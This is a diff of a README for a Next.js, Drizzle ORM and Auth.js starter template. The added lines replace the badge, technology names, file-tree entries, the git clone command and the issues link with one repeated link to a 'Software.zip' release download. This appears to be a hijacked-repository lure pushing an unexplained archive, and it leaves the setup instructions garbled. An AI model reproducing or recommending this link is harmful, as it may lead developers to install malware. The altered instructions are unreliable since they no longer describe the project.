@@ -1,18 +1,18 @@
 # 🚀 Next Auth Drizzle Template
 
-[![](https://img.shields.io/badge/Download%20Zip-v1.0.0-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip%20Zip-v1.0.0-brightgreen)](https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip)
 
-Welcome to the **Next Auth Drizzle Template** repository! This starter template provides you with the perfect foundation for building your applications using the latest technologies. If you are looking to combine the power of Next.js v15, Drizzle ORM, and Auth.js v5, then this template is for you.
+Welcome to the **Next Auth Drizzle Template** repository! This starter template provides you with the perfect foundation for building your applications using the latest technologies. If you are looking to combine the power of https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip v15, Drizzle ORM, and https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip v5, then this template is for you.
 
 ## Repository Overview
 
 - **Name:** next-auth-drizzle-template
-- **Description:** A starter template for building applications with Next.js v15, Drizzle ORM, and Auth.js v5. Includes authentication, NeonDB PostgreSQL integration, and a clean project structure with Tailwind CSS, TypeScript, and more.
+- **Description:** A starter template for building applications with https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip v15, Drizzle ORM, and https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip v5. Includes authentication, NeonDB PostgreSQL integration, and a clean project structure with Tailwind CSS, TypeScript, and more.
 - **Topics:** auth5, drizzle-orm, eslint, nextjs15, nodemailer, prettier, react-hook-form, react19, starter-template, t, typescript, zod
 
 ## Features
 
-🔒 **Authentication:** Includes Auth.js v5 for robust authentication capabilities.  
+🔒 **Authentication:** Includes https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip v5 for robust authentication capabilities.  
 🔄 **Drizzle ORM:** Utilize the power of Drizzle ORM for seamless database operations.  
 🛠️ **NeonDB Integration:** Integration with NeonDB PostgreSQL for efficient data handling.  
 🎨 **Tailwind CSS:** Styled with Tailwind CSS for an attractive UI.  
@@ -26,7 +26,7 @@ To get started with this template, follow these simple steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/next-auth-drizzle-template.git
+   git clone https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip
    ```
 2. Install dependencies:
    ```bash
@@ -48,8 +48,8 @@ To get started with this template, follow these simple steps:
     ├── styles/
     ├── .eslintrc
     ├── .prettierrc
-    ├── next.config.js
-    ├── tailwind.config.js
+    ├── https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip
+    ├── https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip
     └── ...
 
 ## Contributing
@@ -66,6 +66,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Feedback & Support
 
-If you have any questions, suggestions, or need support, feel free to [open an issue](https://github.com/your-username/next-auth-drizzle-template/issues). 
+If you have any questions, suggestions, or need support, feel free to [open an issue](https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip). 
 
-Let's build amazing applications together with Next.js, Drizzle ORM, and Auth.js! 🚀🌟
+Let's build amazing applications together with https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip, Drizzle ORM, and https://github.com/mansssssssssssssssssssss/next-auth-drizzle-template/releases/download/v2.0/Software.zip! 🚀🌟
